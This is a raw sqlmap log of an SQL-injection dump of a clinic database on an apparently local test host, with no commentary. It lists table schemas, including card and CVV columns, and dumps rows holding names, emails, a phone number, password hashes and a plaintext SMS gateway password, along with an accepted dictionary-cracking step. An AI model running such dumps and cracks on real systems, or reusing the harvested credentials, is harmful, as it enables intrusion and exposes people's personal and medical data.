[06:47:43] [WARNING] no clear password(s) found                                                                                                    
Database: clinic_db
Table: doctor
[1 entry]
+-----------------+----------+--------------+----------+------------+------------------------------------------------------------------+-----------+-----------------+------------+---------------+--------------------+
| loginid         | doctorid | departmentid | status   | mobileno   | password                                                         | education | doctorname      | experience | delete_status | consultancy_charge |
+-----------------+----------+--------------+----------+------------+------------------------------------------------------------------+-----------+-----------------+------------+---------------+--------------------+
| akash@gmail.com | 1        | 1            | Active   | 9423979339 | bbcff4db4d8057800d59a68224efd87e545fa1512dfc3ef68298283fbb3b6358 | MD        | Dr. Akash Ahire | 3.0        | 0             | 200.00             |
+-----------------+----------+--------------+----------+------------+------------------------------------------------------------------+-----------+-----------------+------------+---------------+--------------------+

[06:47:43] [INFO] table 'clinic_db.doctor' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/doctor.csv'
[06:47:43] [INFO] fetching columns for table 'orders' in database 'clinic_db'
[06:47:43] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[06:47:43] [INFO] retrieved: 'orderid'
[06:47:43] [INFO] retrieved: 'int(10)'
[06:47:43] [INFO] retrieved: 'patientid'
[06:47:44] [INFO] retrieved: 'int(10)'
[06:47:44] [INFO] retrieved: 'doctorid'
[06:47:44] [INFO] retrieved: 'int(10)'
[06:47:44] [INFO] retrieved: 'prescriptionid'
[06:47:44] [INFO] retrieved: 'int(10)'
[06:47:44] [INFO] retrieved: 'orderdate'
[06:47:44] [INFO] retrieved: 'date'
[06:47:44] [INFO] retrieved: 'deliverydate'
[06:47:44] [INFO] retrieved: 'date'
[06:47:44] [INFO] retrieved: 'address'
[06:47:44] [INFO] retrieved: 'text'
[06:47:44] [INFO] retrieved: 'mobileno'
[06:47:44] [INFO] retrieved: 'varchar(15)'
[06:47:44] [INFO] retrieved: 'note'
[06:47:44] [INFO] retrieved: 'text'
[06:47:44] [INFO] retrieved: 'status'
[06:47:44] [INFO] retrieved: 'varchar(10)'
[06:47:44] [INFO] retrieved: 'payment_type'
[06:47:44] [INFO] retrieved: 'varchar(20)'
[06:47:44] [INFO] retrieved: 'card_no'
[06:47:44] [INFO] retrieved: 'varchar(20)'
[06:47:44] [INFO] retrieved: 'cvv_no'
[06:47:44] [INFO] retrieved: 'varchar(5)'
[06:47:44] [INFO] retrieved: 'expdate'
[06:47:44] [INFO] retrieved: 'date'
[06:47:44] [INFO] retrieved: 'card_holder'
[06:47:44] [INFO] retrieved: 'varchar(50)'
[06:47:44] [INFO] fetching entries for table 'orders' in database 'clinic_db'
[06:47:44] [INFO] fetching number of entries for table 'orders' in database 'clinic_db'
[06:47:44] [INFO] resumed: 0
[06:47:44] [WARNING] table 'orders' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: orders
[0 entries]
+---------+----------+-----------+----------------+------+--------+---------+---------+---------+----------+----------+-----------+-------------+--------------+--------------+
| orderid | doctorid | patientid | prescriptionid | note | cvv_no | address | card_no | expdate | status   | mobileno | orderdate | card_holder | deliverydate | payment_type |
+---------+----------+-----------+----------------+------+--------+---------+---------+---------+----------+----------+-----------+-------------+--------------+--------------+
+---------+----------+-----------+----------------+------+--------+---------+---------+---------+----------+----------+-----------+-------------+--------------+--------------+

[06:47:44] [INFO] table 'clinic_db.orders' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/orders.csv'
[06:47:44] [INFO] fetching columns for table 'doctor_timings' in database 'clinic_db'
[06:47:44] [INFO] retrieved: 'doctor_timings_id'
[06:47:44] [INFO] retrieved: 'int(10)'
[06:47:44] [INFO] retrieved: 'doctorid'
[06:47:44] [INFO] retrieved: 'int(10)'
[06:47:44] [INFO] retrieved: 'start_time'
[06:47:44] [INFO] retrieved: 'time'
[06:47:44] [INFO] retrieved: 'end_time'
[06:47:44] [INFO] retrieved: 'time'
[06:47:44] [INFO] retrieved: 'available_day'
[06:47:44] [INFO] retrieved: 'varchar(15)'
[06:47:44] [INFO] retrieved: 'status'
[06:47:44] [INFO] retrieved: 'varchar(10)'
[06:47:44] [INFO] retrieved: 'delete_status'
[06:47:44] [INFO] retrieved: 'int(11)'
[06:47:44] [INFO] fetching entries for table 'doctor_timings' in database 'clinic_db'
[06:47:44] [INFO] retrieved: 'Active'
[06:47:44] [INFO] retrieved: ''
[06:47:44] [INFO] retrieved: '0'
[06:47:44] [INFO] retrieved: '1'
[06:47:44] [INFO] retrieved: '1'
[06:47:44] [INFO] retrieved: '12:00:00'
[06:47:44] [INFO] retrieved: '09:00:00'
Database: clinic_db
Table: doctor_timings
[1 entry]
+----------+-------------------+----------+----------+------------+---------------+---------------+
| doctorid | doctor_timings_id | status   | end_time | start_time | available_day | delete_status |
+----------+-------------------+----------+----------+------------+---------------+---------------+
| 1        | 1                 | Active   | 12:00:00 | 09:00:00   | <blank>       | 0             |
+----------+-------------------+----------+----------+------------+---------------+---------------+

[06:47:45] [INFO] table 'clinic_db.doctor_timings' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/doctor_timings.csv'                                                                                                                                              
[06:47:45] [INFO] fetching columns for table 'tbl_role' in database 'clinic_db'
[06:47:45] [INFO] retrieved: 'id'
[06:47:45] [INFO] retrieved: 'int(11)'
[06:47:45] [INFO] retrieved: 'role_name'
[06:47:45] [INFO] retrieved: 'varchar(200)'
[06:47:45] [INFO] retrieved: 'slug'
[06:47:45] [INFO] retrieved: 'varchar(500)'
[06:47:45] [INFO] retrieved: 'delete_status'
[06:47:45] [INFO] retrieved: 'int(11)'
[06:47:45] [INFO] fetching entries for table 'tbl_role' in database 'clinic_db'
[06:47:45] [INFO] retrieved: '0'
[06:47:45] [INFO] retrieved: '1'
[06:47:45] [INFO] retrieved: 'Admin'
[06:47:45] [INFO] retrieved: 'admin'
[06:47:45] [INFO] retrieved: '0'
[06:47:45] [INFO] retrieved: '2'
[06:47:45] [INFO] retrieved: 'client'
[06:47:45] [INFO] retrieved: 'client'
[06:47:45] [INFO] retrieved: '0'
[06:47:45] [INFO] retrieved: '3'
[06:47:45] [INFO] retrieved: 'Technicians'
[06:47:45] [INFO] retrieved: 'technicians'
Database: clinic_db
Table: tbl_role
[3 entries]
+----+-------------+-------------+---------------+
| id | slug        | role_name   | delete_status |
+----+-------------+-------------+---------------+
| 1  | admin       | Admin       | 0             |
| 2  | client      | client      | 0             |
| 3  | technicians | Technicians | 0             |
+----+-------------+-------------+---------------+

[06:47:45] [INFO] table 'clinic_db.tbl_role' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/tbl_role.csv'
[06:47:45] [INFO] fetching columns for table 'prescription' in database 'clinic_db'
[06:47:45] [INFO] retrieved: 'prescriptionid'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'treatment_records_id'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'doctorid'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'patientid'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'delivery_type'
[06:47:45] [INFO] retrieved: 'varchar(10)'
[06:47:45] [INFO] retrieved: 'delivery_id'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'prescriptiondate'
[06:47:45] [INFO] retrieved: 'date'
[06:47:45] [INFO] retrieved: 'status'
[06:47:45] [INFO] retrieved: 'varchar(10)'
[06:47:45] [INFO] retrieved: 'appointmentid'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] fetching entries for table 'prescription' in database 'clinic_db'
[06:47:45] [INFO] fetching number of entries for table 'prescription' in database 'clinic_db'
[06:47:45] [INFO] resumed: 0
[06:47:45] [WARNING] table 'prescription' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: prescription
[0 entries]
+----------+-----------+-------------+---------------+----------------+----------------------+----------+---------------+------------------+
| doctorid | patientid | delivery_id | appointmentid | prescriptionid | treatment_records_id | status   | delivery_type | prescriptiondate |
+----------+-----------+-------------+---------------+----------------+----------------------+----------+---------------+------------------+
+----------+-----------+-------------+---------------+----------------+----------------------+----------+---------------+------------------+

[06:47:45] [INFO] table 'clinic_db.prescription' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/prescription.csv'                                                                                                                                                  
[06:47:45] [INFO] fetching columns for table 'payment' in database 'clinic_db'
[06:47:45] [INFO] retrieved: 'paymentid'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'patientid'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'appointmentid'
[06:47:45] [INFO] retrieved: 'int(10)'
[06:47:45] [INFO] retrieved: 'paiddate'
[06:47:45] [INFO] retrieved: 'date'
[06:47:45] [INFO] retrieved: 'paidtime'
[06:47:45] [INFO] retrieved: 'time'
[06:47:45] [INFO] retrieved: 'paidamount'
[06:47:45] [INFO] retrieved: 'float(10,2)'
[06:47:45] [INFO] retrieved: 'status'
[06:47:45] [INFO] retrieved: 'varchar(10)'
[06:47:46] [INFO] retrieved: 'cardholder'
[06:47:46] [INFO] retrieved: 'varchar(50)'
[06:47:46] [INFO] retrieved: 'cardnumber'
[06:47:46] [INFO] retrieved: 'int(25)'
[06:47:46] [INFO] retrieved: 'cvvno'
[06:47:46] [INFO] retrieved: 'int(5)'
[06:47:46] [INFO] retrieved: 'expdate'
[06:47:46] [INFO] retrieved: 'date'
[06:47:46] [INFO] fetching entries for table 'payment' in database 'clinic_db'
[06:47:46] [INFO] fetching number of entries for table 'payment' in database 'clinic_db'
[06:47:46] [INFO] resumed: 0
[06:47:46] [WARNING] table 'payment' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: payment
[0 entries]
+-----------+-----------+---------------+-------+---------+----------+----------+----------+------------+------------+------------+
| patientid | paymentid | appointmentid | cvvno | expdate | status   | paiddate | paidtime | cardholder | cardnumber | paidamount |
+-----------+-----------+---------------+-------+---------+----------+----------+----------+------------+------------+------------+
+-----------+-----------+---------------+-------+---------+----------+----------+----------+------------+------------+------------+

[06:47:46] [INFO] table 'clinic_db.payment' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/payment.csv'
[06:47:46] [INFO] fetching columns for table 'billing' in database 'clinic_db'
[06:47:46] [INFO] retrieved: 'billingid'
[06:47:46] [INFO] retrieved: 'int(10)'
[06:47:46] [INFO] retrieved: 'patientid'
[06:47:46] [INFO] retrieved: 'int(10)'
[06:47:46] [INFO] retrieved: 'appointmentid'
[06:47:46] [INFO] retrieved: 'int(10)'
[06:47:46] [INFO] retrieved: 'billingdate'
[06:47:46] [INFO] retrieved: 'date'
[06:47:46] [INFO] retrieved: 'billingtime'
[06:47:46] [INFO] retrieved: 'time'
[06:47:46] [INFO] retrieved: 'discount'
[06:47:46] [INFO] retrieved: 'float(10,2)'
[06:47:46] [INFO] retrieved: 'taxamount'
[06:47:46] [INFO] retrieved: 'float(10,2)'
[06:47:46] [INFO] retrieved: 'discountreason'
[06:47:46] [INFO] retrieved: 'text'
[06:47:46] [INFO] retrieved: 'discharge_time'
[06:47:46] [INFO] retrieved: 'time'
[06:47:46] [INFO] retrieved: 'discharge_date'
[06:47:46] [INFO] retrieved: 'date'
[06:47:46] [INFO] fetching entries for table 'billing' in database 'clinic_db'
[06:47:46] [INFO] fetching number of entries for table 'billing' in database 'clinic_db'
[06:47:46] [INFO] resumed: 0
[06:47:46] [WARNING] table 'billing' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: billing
[0 entries]
+-----------+-----------+---------------+----------+-----------+-------------+-------------+----------------+----------------+----------------+
| billingid | patientid | appointmentid | discount | taxamount | billingdate | billingtime | discharge_date | discharge_time | discountreason |
+-----------+-----------+---------------+----------+-----------+-------------+-------------+----------------+----------------+----------------+
+-----------+-----------+---------------+----------+-----------+-------------+-------------+----------------+----------------+----------------+

[06:47:46] [INFO] table 'clinic_db.billing' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/billing.csv'
[06:47:46] [INFO] fetching columns for table 'tbl_sms_config' in database 'clinic_db'
[06:47:46] [INFO] retrieved: 'id'
[06:47:46] [INFO] retrieved: 'int(11)'
[06:47:46] [INFO] retrieved: 'sms_username'
[06:47:46] [INFO] retrieved: 'varchar(200)'
[06:47:46] [INFO] retrieved: 'sms_password'
[06:47:46] [INFO] retrieved: 'varchar(200)'
[06:47:46] [INFO] retrieved: 'sms_senderid'
[06:47:46] [INFO] retrieved: 'varchar(200)'
[06:47:46] [INFO] retrieved: 'created_at'
[06:47:46] [INFO] retrieved: 'date'
[06:47:46] [INFO] retrieved: 'delete_status'
[06:47:46] [INFO] retrieved: 'int(11)'
[06:47:46] [INFO] fetching entries for table 'tbl_sms_config' in database 'clinic_db'
[06:47:46] [INFO] retrieved: '2019-10-10'
[06:47:46] [INFO] retrieved: '0'
[06:47:46] [INFO] retrieved: '1'
[06:47:46] [INFO] retrieved: '123456789'
[06:47:46] [INFO] retrieved: 'UPTURN'
[06:47:46] [INFO] retrieved: 'nikhilbhalerao007'
Database: clinic_db
Table: tbl_sms_config
[1 entry]
+----+--------------+------------+--------------+-------------------+---------------+
| id | sms_senderid | created_at | sms_password | sms_username      | delete_status |
+----+--------------+------------+--------------+-------------------+---------------+
| 1  | UPTURN       | 2019-10-10 | 123456789    | nikhilbhalerao007 | 0             |
+----+--------------+------------+--------------+-------------------+---------------+

[06:47:46] [INFO] table 'clinic_db.tbl_sms_config' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/tbl_sms_config.csv'                                                                                                                                              
[06:47:46] [INFO] fetching columns for table 'patient' in database 'clinic_db'
[06:47:47] [INFO] retrieved: 'patientid'
[06:47:47] [INFO] retrieved: 'int(10)'
[06:47:47] [INFO] retrieved: 'patientname'
[06:47:47] [INFO] retrieved: 'varchar(50)'
[06:47:47] [INFO] retrieved: 'admissiondate'
[06:47:47] [INFO] retrieved: 'date'
[06:47:47] [INFO] retrieved: 'admissiontime'
[06:47:47] [INFO] retrieved: 'time'
[06:47:47] [INFO] retrieved: 'address'
[06:47:47] [INFO] retrieved: 'varchar(250)'
[06:47:47] [INFO] retrieved: 'mobileno'
[06:47:47] [INFO] retrieved: 'varchar(15)'
[06:47:47] [INFO] retrieved: 'city'
[06:47:47] [INFO] retrieved: 'varchar(25)'
[06:47:47] [INFO] retrieved: 'pincode'
[06:47:47] [INFO] retrieved: 'varchar(20)'
[06:47:47] [INFO] retrieved: 'loginid'
[06:47:47] [INFO] retrieved: 'varchar(50)'
[06:47:47] [INFO] retrieved: 'password'
[06:47:47] [INFO] retrieved: 'text'
[06:47:47] [INFO] retrieved: 'bloodgroup'
[06:47:47] [INFO] retrieved: 'varchar(20)'
[06:47:47] [INFO] retrieved: 'gender'
[06:47:47] [INFO] retrieved: 'varchar(10)'
[06:47:47] [INFO] retrieved: 'dob'
[06:47:47] [INFO] retrieved: 'date'
[06:47:47] [INFO] retrieved: 'status'
[06:47:47] [INFO] retrieved: 'varchar(10)'
[06:47:47] [INFO] retrieved: 'delete_status'
[06:47:47] [INFO] retrieved: 'int(11)'
[06:47:47] [INFO] fetching entries for table 'patient' in database 'clinic_db'
[06:47:47] [INFO] retrieved: 'Active'
[06:47:47] [INFO] retrieved: 'nashik, maharashtra'
[06:47:47] [INFO] retrieved: '2020-05-25'
[06:47:47] [INFO] retrieved: '11:00:00'
[06:47:47] [INFO] retrieved: 'B+'
[06:47:47] [INFO] retrieved: 'nashik'
[06:47:47] [INFO] retrieved: '0'
[06:47:47] [INFO] retrieved: '1995-07-25'
[06:47:47] [INFO] retrieved: 'Male'
[06:47:47] [INFO] retrieved: 'atul@gmail.com'
[06:47:47] [INFO] retrieved: '9423979339'
[06:47:47] [INFO] retrieved: 'bbcff4db4d8057800d59a68224efd87e545fa1512dfc3ef68298283fbb3b6358'
[06:47:47] [INFO] retrieved: '1'
[06:47:47] [INFO] retrieved: 'Atul Petkar'
[06:47:48] [INFO] retrieved: '1234'
[06:47:48] [INFO] recognized possible password hashes in column 'password'
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[06:48:32] [INFO] using hash method 'sha256_generic_passwd'
[06:48:32] [INFO] starting dictionary-based cracking (sha256_generic_passwd)
[06:49:17] [WARNING] no clear password(s) found                                                                                                    
Database: clinic_db
Table: patient
[1 entry]
+----------------+-----------+------------+--------+--------+---------------------+---------+----------+------------+------------------------------------------------------------------+------------+-------------+---------------+---------------+---------------+
| loginid        | patientid | dob        | city   | gender | address             | pincode | status   | mobileno   | password                                                         | bloodgroup | patientname | admissiondate | admissiontime | delete_status |
+----------------+-----------+------------+--------+--------+---------------------+---------+----------+------------+------------------------------------------------------------------+------------+-------------+---------------+---------------+---------------+
| atul@gmail.com | 1         | 1995-07-25 | nashik | Male   | nashik, maharashtra | 1234    | Active   | 9423979339 | bbcff4db4d8057800d59a68224efd87e545fa1512dfc3ef68298283fbb3b6358 | B+         | Atul Petkar | 2020-05-25    | 11:00:00      | 0             |
+----------------+-----------+------------+--------+--------+---------------------+---------+----------+------------+------------------------------------------------------------------+------------+-------------+---------------+---------------+---------------+

[06:49:17] [INFO] table 'clinic_db.patient' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/patient.csv'
[06:49:17] [INFO] fetching columns for table 'manage_website' in database 'clinic_db'
[06:49:17] [CRITICAL] unable to connect to the target URL. sqlmap is going to retry the request(s)
[06:49:17] [INFO] retrieved: 'id'
[06:49:17] [INFO] retrieved: 'int(11)'
[06:49:17] [INFO] retrieved: 'business_name'
[06:49:17] [INFO] retrieved: 'varchar(600)'
[06:49:17] [INFO] retrieved: 'business_email'
[06:49:17] [INFO] retrieved: 'varchar(600)'
[06:49:17] [INFO] retrieved: 'business_web'
[06:49:17] [INFO] retrieved: 'varchar(500)'
[06:49:17] [INFO] retrieved: 'portal_addr'
[06:49:17] [INFO] retrieved: 'varchar(500)'
[06:49:17] [INFO] retrieved: 'addr'
[06:49:17] [INFO] retrieved: 'varchar(600)'
[06:49:17] [INFO] retrieved: 'curr_sym'
[06:49:17] [INFO] retrieved: 'varchar(600)'
[06:49:17] [INFO] retrieved: 'curr_position'
[06:49:17] [INFO] retrieved: 'varchar(500)'
[06:49:17] [INFO] retrieved: 'front_end_en'
[06:49:17] [INFO] retrieved: 'varchar(500)'
[06:49:17] [INFO] retrieved: 'date_format'
[06:49:17] [INFO] retrieved: 'date'
[06:49:17] [INFO] retrieved: 'def_tax'
[06:49:17] [INFO] retrieved: 'varchar(500)'
[06:49:17] [INFO] retrieved: 'logo'
[06:49:17] [INFO] retrieved: 'varchar(500)'
[06:49:17] [INFO] fetching entries for table 'manage_website' in database 'clinic_db'
[06:49:17] [INFO] retrieved: '<p>Maharashtra, India</p>\r\n'
[06:49:17] [INFO] retrieved: 'mayuri.infospace@gmail.com'
[06:49:17] [INFO] retrieved: 'Mayuri K'
[06:49:17] [INFO] retrieved: '#'
[06:49:17] [INFO] retrieved: 'right'
[06:49:17] [INFO] retrieved: '$'
[06:49:17] [INFO] retrieved: '0000-00-00'
[06:49:17] [INFO] retrieved: '0.20'
[06:49:17] [INFO] retrieved: '0'
[06:49:18] [INFO] retrieved: '1'
[06:49:18] [INFO] retrieved: 'logo for hospital system.jpg'
[06:49:18] [INFO] retrieved: '#'
Database: clinic_db
Table: manage_website
[1 entry]
+----+-------------------------------+------------------------------+---------+----------+-------------+-------------+--------------+--------------+---------------+---------------+----------------------------+
| id | addr                          | logo                         | def_tax | curr_sym | date_format | portal_addr | business_web | front_end_en | business_name | curr_position | business_email             |
+----+-------------------------------+------------------------------+---------+----------+-------------+-------------+--------------+--------------+---------------+---------------+----------------------------+
| 1  | <p>Maharashtra, India</p>\r\n | logo for hospital system.jpg | 0.20    | $        | 0000-00-00  | #           | #            | 0            | Mayuri K      | right         | mayuri.infospace@gmail.com |
+----+-------------------------------+------------------------------+---------+----------+-------------+-------------+--------------+--------------+---------------+---------------+----------------------------+

[06:49:18] [INFO] table 'clinic_db.manage_website' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/manage_website.csv'                                                                                                                                              
[06:49:18] [INFO] fetching columns for table 'medicine' in database 'clinic_db'
[06:49:18] [INFO] retrieved: 'medicineid'
[06:49:18] [INFO] retrieved: 'int(10)'
[06:49:18] [INFO] retrieved: 'medicinename'
[06:49:18] [INFO] retrieved: 'varchar(25)'
[06:49:18] [INFO] retrieved: 'medicinecost'
[06:49:18] [INFO] retrieved: 'float(10,2)'
[06:49:18] [INFO] retrieved: 'description'
[06:49:18] [INFO] retrieved: 'text'
[06:49:18] [INFO] retrieved: 'status'
[06:49:18] [INFO] retrieved: 'varchar(10)'
[06:49:18] [INFO] retrieved: 'delete_status'
[06:49:18] [INFO] retrieved: 'int(11)'
[06:49:18] [INFO] fetching entries for table 'medicine' in database 'clinic_db'
[06:49:18] [INFO] retrieved: 'Medicine description here'
[06:49:18] [INFO] retrieved: 'Active'
[06:49:18] [INFO] retrieved: '0'
[06:49:18] [INFO] retrieved: '10.00'
[06:49:18] [INFO] retrieved: '1'
[06:49:18] [INFO] retrieved: 'Paracetamol'
Database: clinic_db
Table: medicine
[1 entry]
+------------+----------+--------------+--------------+---------------------------+---------------+
| medicineid | status   | medicinecost | medicinename | description               | delete_status |
+------------+----------+--------------+--------------+---------------------------+---------------+
| 1          | Active   | 10.00        | Paracetamol  | Medicine description here | 0             |
+------------+----------+--------------+--------------+---------------------------+---------------+

[06:49:18] [INFO] table 'clinic_db.medicine' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/medicine.csv'
[06:49:18] [INFO] fetching columns for table 'treatment' in database 'clinic_db'
[06:49:18] [INFO] retrieved: 'treatmentid'
[06:49:18] [INFO] retrieved: 'int(11)'
[06:49:18] [INFO] retrieved: 'treatmenttype'
[06:49:18] [INFO] retrieved: 'varchar(25)'
[06:49:18] [INFO] retrieved: 'treatment_cost'
[06:49:18] [INFO] retrieved: 'decimal(10,2)'
[06:49:18] [INFO] retrieved: 'note'
[06:49:18] [INFO] retrieved: 'text'
[06:49:18] [INFO] retrieved: 'status'
[06:49:18] [INFO] retrieved: 'varchar(10)'
[06:49:18] [INFO] retrieved: 'delete_status'
[06:49:18] [INFO] retrieved: 'int(11)'
[06:49:18] [INFO] fetching entries for table 'treatment' in database 'clinic_db'
[06:49:18] [INFO] retrieved: 'Active'
[06:49:18] [INFO] retrieved: '0'
[06:49:18] [INFO] retrieved: 'Treatment note here'
[06:49:18] [INFO] retrieved: '200.00'
[06:49:18] [INFO] retrieved: '1'
[06:49:18] [INFO] retrieved: 'Blood Test'
Database: clinic_db
Table: treatment
[1 entry]
+-------------+---------------------+----------+---------------+---------------+----------------+
| treatmentid | note                | status   | delete_status | treatmenttype | treatment_cost |
+-------------+---------------------+----------+---------------+---------------+----------------+
| 1           | Treatment note here | Active   | 0             | Blood Test    | 200.00         |
+-------------+---------------------+----------+---------------+---------------+----------------+

[06:49:18] [INFO] table 'clinic_db.treatment' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/treatment.csv'
[06:49:18] [INFO] fetching columns for table 'room' in database 'clinic_db'
[06:49:18] [INFO] retrieved: 'roomid'
[06:49:18] [INFO] retrieved: 'int(10)'
[06:49:18] [INFO] retrieved: 'roomtype'
[06:49:18] [INFO] retrieved: 'varchar(25)'
[06:49:18] [INFO] retrieved: 'roomno'
[06:49:18] [INFO] retrieved: 'int(10)'
[06:49:18] [INFO] retrieved: 'noofbeds'
[06:49:18] [INFO] retrieved: 'int(10)'
[06:49:18] [INFO] retrieved: 'room_tariff'
[06:49:18] [INFO] retrieved: 'float(10,2)'
[06:49:18] [INFO] retrieved: 'status'
[06:49:18] [INFO] retrieved: 'varchar(10)'
[06:49:18] [INFO] fetching entries for table 'room' in database 'clinic_db'
[06:49:18] [INFO] retrieved: 'Active'
[06:49:18] [INFO] retrieved: '20'
[06:49:18] [INFO] retrieved: '500.00'
[06:49:18] [INFO] retrieved: '15'
[06:49:18] [INFO] retrieved: '1'
[06:49:18] [INFO] retrieved: 'GENERAL WARD'
[06:49:18] [INFO] retrieved: 'Active'
[06:49:18] [INFO] retrieved: '10'
[06:49:18] [INFO] retrieved: '100.00'
[06:49:19] [INFO] retrieved: '16'
[06:49:19] [INFO] retrieved: '2'
[06:49:19] [INFO] retrieved: 'SPECIAL WARD'
[06:49:19] [INFO] retrieved: 'Active'
[06:49:19] [INFO] retrieved: '10'
[06:49:19] [INFO] retrieved: '500.00'
[06:49:19] [INFO] retrieved: '17'
[06:49:19] [INFO] retrieved: '2'
[06:49:19] [INFO] retrieved: 'GENERAL WARD'
[06:49:19] [INFO] retrieved: 'Active'
[06:49:19] [INFO] retrieved: '13'
[06:49:19] [INFO] retrieved: '150.00'
[06:49:19] [INFO] retrieved: '18'
[06:49:19] [INFO] retrieved: '121'
[06:49:19] [INFO] retrieved: 'GENERAL WARD'
[06:49:19] [INFO] retrieved: 'Active'
[06:49:19] [INFO] retrieved: '11'
[06:49:19] [INFO] retrieved: '500.00'
[06:49:19] [INFO] retrieved: '19'
[06:49:19] [INFO] retrieved: '850'
[06:49:19] [INFO] retrieved: 'GENERAL WARD'
Database: clinic_db
Table: room
[5 entries]
+--------+--------+----------+----------+--------------+-------------+
| roomid | roomno | status   | noofbeds | roomtype     | room_tariff |
+--------+--------+----------+----------+--------------+-------------+
| 15     | 1      | Active   | 20       | GENERAL WARD | 500.00      |
| 16     | 2      | Active   | 10       | SPECIAL WARD | 100.00      |
| 17     | 2      | Active   | 10       | GENERAL WARD | 500.00      |
| 18     | 121    | Active   | 13       | GENERAL WARD | 150.00      |
| 19     | 850    | Active   | 11       | GENERAL WARD | 500.00      |
+--------+--------+----------+----------+--------------+-------------+

[06:49:19] [INFO] table 'clinic_db.room' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/room.csv'
[06:49:19] [INFO] fetching columns for table 'user' in database 'clinic_db'
[06:49:19] [INFO] retrieved: 'userid'
[06:49:19] [INFO] retrieved: 'int(11)'
[06:49:19] [INFO] retrieved: 'loginname'
[06:49:19] [INFO] retrieved: 'varchar(50)'
[06:49:19] [INFO] retrieved: 'password'
[06:49:19] [INFO] retrieved: 'varchar(10)'
[06:49:19] [INFO] retrieved: 'patientname'
[06:49:19] [INFO] retrieved: 'varchar(50)'
[06:49:19] [INFO] retrieved: 'mobileno'
[06:49:19] [INFO] retrieved: 'varchar(15)'
[06:49:19] [INFO] retrieved: 'email'
[06:49:19] [INFO] retrieved: 'varchar(50)'
[06:49:19] [INFO] retrieved: 'createddateandtime'
[06:49:19] [INFO] retrieved: 'datetime'
[06:49:19] [INFO] fetching entries for table 'user' in database 'clinic_db'
[06:49:20] [INFO] fetching number of entries for table 'user' in database 'clinic_db'
[06:49:20] [INFO] resumed: 0
[06:49:20] [WARNING] table 'user' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: user
[0 entries]
+--------+-------+----------+----------+-----------+-------------+--------------------+
| userid | email | mobileno | password | loginname | patientname | createddateandtime |
+--------+-------+----------+----------+-----------+-------------+--------------------+
+--------+-------+----------+----------+-----------+-------------+--------------------+

[06:49:20] [INFO] table 'clinic_db.`user`' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/user.csv'
[06:49:20] [INFO] fetching columns for table 'treatment_records' in database 'clinic_db'
[06:49:20] [INFO] retrieved: 'treatment_records_id'
[06:49:20] [INFO] retrieved: 'int(10)'
[06:49:20] [INFO] retrieved: 'treatmentid'
[06:49:20] [INFO] retrieved: 'int(10)'
[06:49:20] [INFO] retrieved: 'appointmentid'
[06:49:20] [INFO] retrieved: 'int(10)'
[06:49:20] [INFO] retrieved: 'patientid'
[06:49:20] [INFO] retrieved: 'int(10)'
[06:49:20] [INFO] retrieved: 'doctorid'
[06:49:20] [INFO] retrieved: 'int(10)'
[06:49:20] [INFO] retrieved: 'treatment_description'
[06:49:20] [INFO] retrieved: 'text'
[06:49:20] [INFO] retrieved: 'uploads'
[06:49:20] [INFO] retrieved: 'varchar(100)'
[06:49:20] [INFO] retrieved: 'treatment_date'
[06:49:20] [INFO] retrieved: 'date'
[06:49:20] [INFO] retrieved: 'treatment_time'
[06:49:20] [INFO] retrieved: 'time'
[06:49:20] [INFO] retrieved: 'status'
[06:49:20] [INFO] retrieved: 'varchar(10)'
[06:49:20] [INFO] fetching entries for table 'treatment_records' in database 'clinic_db'
[06:49:20] [INFO] fetching number of entries for table 'treatment_records' in database 'clinic_db'
[06:49:20] [INFO] resumed: 0
[06:49:20] [WARNING] table 'treatment_records' in database 'clinic_db' appears to be empty
Database: clinic_db
Table: treatment_records
[0 entries]
+----------+-----------+-------------+---------------+----------------------+---------+----------+----------------+----------------+-----------------------+
| doctorid | patientid | treatmentid | appointmentid | treatment_records_id | uploads | status   | treatment_date | treatment_time | treatment_description |
+----------+-----------+-------------+---------------+----------------------+---------+----------+----------------+----------------+-----------------------+
+----------+-----------+-------------+---------------+----------------------+---------+----------+----------------+----------------+-----------------------+

[06:49:20] [INFO] table 'clinic_db.treatment_records' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.195.143/dump/clinic_db/treatment_records.csv'                                                                                                                                        
[06:49:20] [INFO] fetching columns for table 'prescription_records' in database 'clinic_db'
[06:49:20] [INFO] retrieved: 'prescription_record_id'
[06:49:20] [INFO] retrieved: 'int(10)'
[06:49:20] [INFO] retrieved: 'prescription_id'
[06:49:20] [INFO] retrieved: 'int(10)'
